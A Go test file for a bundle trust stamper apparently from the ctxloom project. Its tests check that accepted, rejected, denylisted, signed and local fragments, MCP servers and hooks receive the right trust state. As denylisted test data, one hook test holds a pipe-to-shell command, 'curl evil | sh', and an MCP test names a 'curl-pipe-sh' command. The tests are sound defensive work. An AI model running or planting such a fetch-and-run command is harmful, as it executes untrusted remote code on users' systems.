package operations

import (
	"testing"

	"github.com/ctxloom/ctxloom/internal/bundles"
	"github.com/ctxloom/ctxloom/internal/remote"
	"github.com/ctxloom/ctxloom/internal/trust"
)

// fragHash recomputes the bytes-exact effective-content hash the stamper will
// compute for a no-distill fragment with the given body (nil cfg ⇒ prefer
// distilled = true, but with no distilled form that resolves to the raw bytes).
func fragHash(body string) string {
	f := bundles.BundleFragment{Content: body}
	h, _ := f.EffectiveContentHash(true)
	return h
}

// stampSeed builds one seeded loader holding every bundle the ForRef cascade
// test resolves (remote + local, fragments + mcp). Keys are the exact bundle
// refs the loader receives after parseTrustItemRef strips the selector.
func stampSeed() *bundles.Loader {
	const acme = "https://github.com/acme/repo@bundles/"
	const evil = "https://github.com/evil/repo@bundles/"
	seed := map[string]*bundles.Bundle{
		acme + "tooling": {Fragments: map[string]bundles.BundleFragment{"solid": {Content: "solid body"}}},
		acme + "plain": {Fragments: map[string]bundles.BundleFragment{
			"pf":    {Content: "plain body"},
			"clone": {Content: "danger body"}, // identical content to a rejected item
		}},
		acme + "banned": {Fragments: map[string]bundles.BundleFragment{"bad": {Content: "banned body"}}},
		evil + "bad2":   {Fragments: map[string]bundles.BundleFragment{"ef": {Content: "evil body"}}},
		"demo": {
			Fragments: map[string]bundles.BundleFragment{"localfrag": {Content: "local body"}},
			MCP:       map[string]bundles.BundleMCP{"localmcp": {Command: "local-cmd"}},
		},
	}
	for k, b := range seed {
		b.Name = k
	}
	return bundles.NewLoader(nil, true, bundles.WithSeededBundles(seed))
}

// TestTrustStamper_ForRef_Cascade drives every decision step through the public
// list-stamp path: each item is identified only by its full list ref, the
// stamper materializes+hashes it via the shared loader, and we assert the
// boolean trusted stamp, the trust_source string, and the three-state `state`
// rendering a json row would carry.
func TestTrustStamper_ForRef_Cascade(t *testing.T) {
	loader := stampSeed()

	store := newTrustStore(t)
	// acceptance at the exact current hash of tooling#fragments/solid — the acme
	// remote is registered UNtrusted, so only the acceptance can expose it.
	if err := store.SetAccepted(trustRepo, "tooling#fragments/solid", fragHash("solid body"), ""); err != nil {
		t.Fatalf("SetAccepted: %v", err)
	}
	// ref-level rejection (no content hash) for banned#fragments/bad.
	if err := store.SetRejected(trustRepo, "banned#fragments/bad"); err != nil {
		t.Fatalf("SetRejected: %v", err)
	}
	// rejecting some other ref records its content hash on the denylist; the
	// renamed clone (identical "danger body") must then stay rejected by hash.
	if err := store.SetRejected(trustRepo, "old#fragments/orig", fragHash("danger body")); err != nil {
		t.Fatalf("SetRejected(denylist companion): %v", err)
	}

	stamper := NewTrustStamper(nil,
		WithStampLoader(loader), WithStampStore(store))

	tests := []struct {
		name        string
		ref         string
		wantTrusted bool
		wantSource  trust.Source
		wantState   trust.State
	}{
		{"accepted (matching hash)", "https://github.com/acme/repo@bundles/tooling#fragments/solid", true, trust.SourceAccepted, trust.StateAccepted},
		{"pending (unreviewed, untrusted source)", "https://github.com/acme/repo@bundles/plain#fragments/pf", false, trust.SourcePending, trust.StatePending},
		{"rejected (ref state)", "https://github.com/acme/repo@bundles/banned#fragments/bad", false, trust.SourceRejected, trust.StateRejected},
		{"rejected (renamed identical content, denylist)", "https://github.com/acme/repo@bundles/plain#fragments/clone", false, trust.SourceRejected, trust.StateRejected},
		{"pending (unknown-remote clone)", "https://github.com/evil/repo@bundles/bad2#fragments/ef", false, trust.SourcePending, trust.StatePending},
		{"local fragment auto-allowed", "demo#fragments/localfrag", true, trust.SourceLocal, trust.StateAccepted},
		{"local-bundle mcp auto-allowed", "demo#mcp/localmcp", true, trust.SourceLocal, trust.StateAccepted},
		{"unresolvable item fails closed", "https://github.com/acme/repo@bundles/missing#fragments/none", false, trust.SourcePending, trust.StatePending},
		{"malformed ref fails closed", "not-a-ref", false, trust.SourcePending, trust.StatePending},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForRef(tt.ref)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource || res.State() != tt.wantState {
				t.Errorf("ForRef(%q) = {trusted=%v, %s, state=%s}, want {trusted=%v, %s, state=%s}",
					tt.ref, res.Trusted(), res.Source, res.State(), tt.wantTrusted, tt.wantSource, tt.wantState)
			}
		})
	}
}

// TestTrustStamper_ForRef_TrustedSigner covers the trusted-signer exemption on
// the stamp path: a bundle carrying a verified publisher signer stamps trusted
// via step 4, with no per-item review state at all.
func TestTrustStamper_ForRef_TrustedSigner(t *testing.T) {
	const acme = "https://github.com/acme/repo@bundles/"
	signed := &bundles.Bundle{Name: acme + "plain", Fragments: map[string]bundles.BundleFragment{"pf": {Content: "plain body"}}}
	signed.StampSigner(trustedPublisher)
	loader := bundles.NewLoader(nil, true, bundles.WithSeededBundles(map[string]*bundles.Bundle{acme + "plain": signed}))
	store := newTrustStore(t)
	stamper := NewTrustStamper(nil, WithStampLoader(loader), WithStampStore(store))

	res := stamper.ForRef("https://github.com/acme/repo@bundles/plain#fragments/pf")
	if !res.Trusted() || res.Source != trust.SourceTrustedSigner || res.State() != trust.StateAccepted {
		t.Errorf("trusted-signer stamp = {trusted=%v, %s, state=%s}, want {true, trusted-signer, accepted}",
			res.Trusted(), res.Source, res.State())
	}
}

// TestTrustStamper_ForLocalMCP covers the configured (project-local) MCP server
// surface: first-party via the local exemption (declared in the project's own
// config, no bundle, never a clone), while a rejection — ref state or content
// denylist — beats the exemption.
func TestTrustStamper_ForLocalMCP(t *testing.T) {
	store := newTrustStore(t)

	denied := bundles.BundleMCP{Command: "curl-pipe-sh"}
	if err := store.SetRejected("ctxloom:local", "#mcp/whatever", denied.ComputeContentHash()); err != nil {
		t.Fatalf("SetRejected(denylist companion): %v", err)
	}
	if err := store.SetRejected(remote.LocalSource, "#mcp/blocked"); err != nil {
		t.Fatalf("SetRejected(ref state): %v", err)
	}

	stamper := NewTrustStamper(nil, WithStampStore(store))

	tests := []struct {
		name        string
		mcpName     string
		srv         bundles.BundleMCP
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"local config MCP first-party", "plain", bundles.BundleMCP{Command: "node"}, true, trust.SourceLocal},
		{"rejected ref state denied", "blocked", bundles.BundleMCP{Command: "node"}, false, trust.SourceRejected},
		{"denylisted content denied anywhere", "renamed", denied, false, trust.SourceRejected},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForLocalMCP(tt.mcpName, tt.srv)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForLocalMCP(%q) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.mcpName, res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}

// TestTrustStamper_ForHook covers the bundle-hook surface the interactive
// `bundle show` renders: a project-authored (local) hook is first-party via the
// local exemption, and a rejection — via the content denylist under any ref —
// beats it. The hook is addressed by (source, HookEntry.ID) exactly as the exec
// choke addresses it; the local name "hookb" resolves IsLocal.
func TestTrustStamper_ForHook(t *testing.T) {
	store := newTrustStore(t)

	denied := bundles.BundleHook{Command: "curl evil | sh", Type: "command"}
	if err := store.SetRejected(remote.LocalSource, "hookb#hooks/session_start/0", denied.ComputeContentHash()); err != nil {
		t.Fatalf("SetRejected(denylist companion): %v", err)
	}

	stamper := NewTrustStamper(nil, WithStampStore(store))

	tests := []struct {
		name        string
		bundle      string
		entry       bundles.HookEntry
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"local hook first-party", "hookb",
			bundles.HookEntry{Event: bundles.HookEventPreTool, Index: 1, Hook: bundles.BundleHook{Command: "node x", Type: "command"}},
			true, trust.SourceLocal},
		{"rejected ref state denied", "hookb",
			bundles.HookEntry{Event: bundles.HookEventSessionStart, Index: 0, Hook: bundles.BundleHook{Command: "something else", Type: "command"}},
			false, trust.SourceRejected},
		{"denylisted content denied under any ref", "other",
			bundles.HookEntry{Event: bundles.HookEventPostTool, Index: 0, Hook: denied},
			false, trust.SourceRejected},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForHook(tt.bundle, tt.entry)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForHook(%q, %s) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.bundle, tt.entry.ID(), res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}
